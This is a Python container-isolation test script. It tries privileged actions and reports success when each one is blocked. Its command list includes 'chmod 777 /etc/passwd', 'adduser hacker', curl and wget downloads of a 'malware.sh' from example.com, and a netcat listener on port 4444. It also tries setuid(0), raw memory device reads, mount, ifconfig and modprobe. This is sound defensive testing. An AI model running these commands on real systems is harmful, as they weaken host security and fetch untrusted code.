#!/usr/bin/env python3
"""
Container isolation security test script
This script attempts various potentially dangerous actions
to verify that the container properly blocks them.
"""

import os
import subprocess
import sys
import socket
import time
import platform
import ctypes
import pwd
import resource
import signal
import urllib.request

# ANSI escape codes for coloring
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"


def print_status(message, success=None):
    """
    Prints a status message with appropriate coloring.

    :param message: Message to print
    :type message: str
    :param success: Whether the test succeeded, None for info messages
    :type success: bool or None
    :return: None
    :rtype: None
    """
    if success is None:
        # Information
        print(f"{BLUE}[INFO]{RESET} {message}")
    elif success:
        # Success (attack failure = good for security)
        print(f"{GREEN}[PASS]{RESET} {message}")
    else:
        # Failure (attack success = bad for security)
        print(f"{RED}[FAIL]{RESET} {message}")


def run_command(command):
    """
    Executes a command and returns whether it succeeded.

    :param command: Command to execute
    :type command: list
    :return: True if command returned zero exit code, False otherwise
    :rtype: bool
    """
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        # Command succeeded if return code is 0
        return result.returncode == 0
    except (subprocess.SubprocessError, FileNotFoundError):
        return False


def check_filesystem_write():
    """
    Attempts to write to various filesystem locations.

    :return: True if all security checks passed, False otherwise
    :rtype: bool
    """
    print_status("Checking filesystem write permissions...")

    # List of directories to test
    directories = [
        "/",
        "/etc",
        "/bin",
        "/usr/bin",
        "/usr/local/bin",
        "/home",
        "/var"
    ]

    all_tests_passed = True

    for directory in directories:
        try:
            test_file = os.path.join(directory, f"test_file_{time.time()}.txt")
            with open(test_file, "w") as f:
                f.write("This is a test file to check write permissions")

            # If we get here, write succeeded (bad for security)
            print_status(f"Writing to {directory} succeeded - containment failure!", False)
            all_tests_passed = False

            # Try to delete the test file
            try:
                os.remove(test_file)
            except:
                pass

        except (PermissionError, OSError, IOError):
            # Write failed (good for security)
            print_status(f"Writing to {directory} blocked as expected", True)

    return all_tests_passed


def check_process_execution():
    """
    Attempts to execute critical system commands.

    :return: True if all security checks passed, False otherwise
    :rtype: bool
    """
    print_status("Checking process execution permissions...")

    # List of commands to test
    commands = [
        ["chmod", "777", "/etc/passwd"],
        ["adduser", "hacker"],
        ["apt-get", "update"],
        ["apt-get", "install", "netcat"],
        ["curl", "-O", "http://example.com/malware.sh"],
        ["wget", "http://example.com/malware.sh"],
        ["nc", "-l", "-p", "4444"]
    ]

    all_tests_passed = True

    for command in commands:
        cmd_str = " ".join(command)
        if run_command(command):
            # If command succeeds (bad for security)
            print_status(f"Command '{cmd_str}' executed successfully - containment failure!", False)
            all_tests_passed = False
        else:
            # If command fails (good for security)
            print_status(f"Command '{cmd_str}' blocked as expected", True)

    return all_tests_passed


def check_network_access():
    """
    Attempts to establish outgoing network connections.

    :return: True if all security checks passed, False otherwise
    :rtype: bool
    """
    print_status("Checking network access restrictions...")

    all_tests_passed = True
    ports_to_check = [22, 80, 443, 8080, 8888, 5900]
    hosts_to_check = ["8.8.8.8", "1.1.1.1", "google.com", "api.ipify.org"]

    for host in hosts_to_check:
        for port in ports_to_check:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))

                if result == 0:
                    # Connection successful (may be normal for some ports/hosts)
                    if port in [80, 443]:
                        # HTTP/HTTPS are often allowed
                        print_status(f"Connection to {host}:{port} allowed (may be intentional)", None)
                    else:
                        # Other ports should not be accessible
                        print_status(f"Connection to {host}:{port} succeeded - possible security issue", False)
                        all_tests_passed = False
                else:
                    # Connection failed
                    print_status(f"Connection to {host}:{port} blocked as expected", True)

                sock.close()
            except socket.error:
                # Socket error (probably due to restrictions)
                print_status(f"Connection to {host}:{port} blocked or host unreachable", True)

    return all_tests_passed


def check_privilege_escalation():
    """
    Attempts to escalate privileges.

    :return: True if all security checks passed, False otherwise
    :rtype: bool
    """
    print_status("Checking privilege escalation protections...")

    all_tests_passed = True

    # Test 1: Try to become root with setuid
    try:
        os.setuid(0)
        # If we get here, escalation succeeded (bad)
        print_status("Privilege escalation to root via setuid succeeded - containment failure!", False)
        all_tests_passed = False
    except (PermissionError, OSError, AttributeError):
        # Expected error
        print_status("Privilege escalation to root via setuid blocked as expected", True)

    # Test 2: Check if we can access devices
    devices = ["/dev/mem", "/dev/kmem", "/dev/port"]
    for device in devices:
        try:
            with open(device, "rb") as f:
                data = f.read(10)
            # If we get here, access succeeded (bad)
            print_status(f"Access to {device} succeeded - containment failure!", False)
            all_tests_passed = False
        except (PermissionError, OSError, FileNotFoundError):
            # Expected error
            print_status(f"Access to {device} blocked as expected", True)

    # Test 3: Check ability to increase resource limits
    try:
        # Try to increase open file limit
        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
        current = resource.getrlimit(resource.RLIMIT_NOFILE)
        if current[0] >= 100000:
            # If we get here, increase succeeded (bad)
            print_status(f"Resource limit increase succeeded - containment failure!", False)
            all_tests_passed = False
        else:
            print_status(f"Resource limit increase blocked as expected", True)
    except (PermissionError, OSError, ValueError):
        # Expected error
        print_status(f"Resource limit increase blocked as expected", True)

    return all_tests_passed


def check_capabilities():
    """
    Checks available Linux capabilities.

    :return: True if all security checks passed, False otherwise
    :rtype: bool
    """
    print_status("Checking Linux capabilities...")

    # List of important capabilities to check
    capabilities = [
        "CAP_SYS_ADMIN",
        "CAP_NET_ADMIN",
        "CAP_SYS_PTRACE",
        "CAP_SYS_BOOT",
        "CAP_SYS_MODULE",
        "CAP_NET_RAW",
        "CAP_NET_BIND_SERVICE"
    ]

    all_tests_passed = True

    # Test capabilities via specific operations
    # CAP_SYS_ADMIN - Try to mount a filesystem
    if run_command(["mount", "-t", "tmpfs", "none", "/mnt"]):
        print_status("CAP_SYS_ADMIN capability detected - mount succeeded!", False)
        all_tests_passed = False
    else:
        print_status("CAP_SYS_ADMIN capability blocked as expected", True)

    # CAP_NET_ADMIN - Try to configure network interface
    if run_command(["ifconfig", "lo", "down"]):
        print_status("CAP_NET_ADMIN capability detected - network interface config succeeded!", False)
        all_tests_passed = False
    else:
        print_status("CAP_NET_ADMIN capability blocked as expected", True)

    # CAP_SYS_MODULE - Try to load a kernel module
    if run_command(["modprobe", "vfat"]):
        print_status("CAP_SYS_MODULE capability detected - module loading succeeded!", False)
        all_tests_passed = False
    else:
        print_status("CAP_SYS_MODULE capability blocked as expected", True)

    return all_tests_passed

def check_public_ip():
    """
    Checks and prints the public IP address inside the container using urllib.

    :return: True (always passes, just informational)
    :rtype: bool
    """
    print_status("Checking public IP address")
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
            ip = response.read().decode().strip()
            if ip:
                print_status(f"Detected public IP inside container: {ip}", True)
            else:
                print_status("Could not retrieve IP (possibly blocked)", None)
    except Exception as e:
        print_status(f"Error while checking public IP: {e}", None)
    return True

def main():
    """
    Main function executing all isolation tests.

    :return: Exit code (0 for success, 1 for failure)
    :rtype: int
    """
    print_status("=" * 60)
    print_status("CONTAINER ISOLATION SECURITY TEST")
    print_status("=" * 60)
    print_status(f"Date/Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print_status(f"Hostname: {platform.node()}")
    print_status(f"Platform: {platform.platform()}")

    try:
        user_info = pwd.getpwuid(os.getuid())
        print_status(f"Running as user: {user_info.pw_name} (UID: {os.getuid()})")
    except KeyError:
        print_status(f"Running as UID: {os.getuid()}")

    print_status("-" * 60)

    # Run all tests
    tests = [
        ("Filesystem write protection", check_filesystem_write),
        ("Process execution restrictions", check_process_execution),
        ("Network access controls", check_network_access),
        ("Privilege escalation protections", check_privilege_escalation),
        ("Linux capabilities restrictions", check_capabilities),
        ("Public IP check (VPN verification)", check_public_ip),
    ]

    overall_result = True

    for test_name, test_func in tests:
        print_status(f"\nTesting: {test_name}")
        print_status("-" * 40)
        result = test_func()
        overall_result = overall_result and result
        print_status(f"{test_name} tests " + (f"{GREEN}PASSED{RESET}" if result else f"{RED}FAILED{RESET}"))

    print_status("\n" + "=" * 60)
    if overall_result:
        print_status(f"{GREEN}OVERALL: ALL SECURITY TESTS PASSED{RESET}")
        print_status("The container appears to be properly isolated")
    else:
        print_status(f"{RED}OVERALL: SOME SECURITY TESTS FAILED{RESET}")
        print_status("The container has security vulnerabilities that need to be addressed")

    print_status("=" * 60)

    # Return 0 if all good, 1 otherwise
    return 0 if overall_result else 1


if __name__ == "__main__":
    sys.exit(main())